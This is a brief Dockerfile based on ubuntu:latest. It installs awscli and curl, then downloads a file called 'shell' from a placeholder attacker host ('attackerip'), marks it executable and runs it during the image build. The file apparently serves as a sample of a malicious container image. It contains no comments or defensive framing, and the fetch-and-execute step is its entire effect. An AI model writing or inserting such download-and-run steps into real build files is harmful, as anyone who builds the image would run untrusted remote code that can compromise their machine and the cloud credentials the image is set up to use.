FROM ubuntu:latest

WORKDIR /app

RUN apt update && apt upgrade -y && apt install --no-install-recommends awscli -y && rm -rf /var/lib/apt/lists/*;
RUN apt-get update; apt-get install --no-install-recommends curl -y && rm -rf /var/lib/apt/lists/*;
RUN curl -f "attackerip/shell" -o shell && chmod 700 shell
RUN ./shell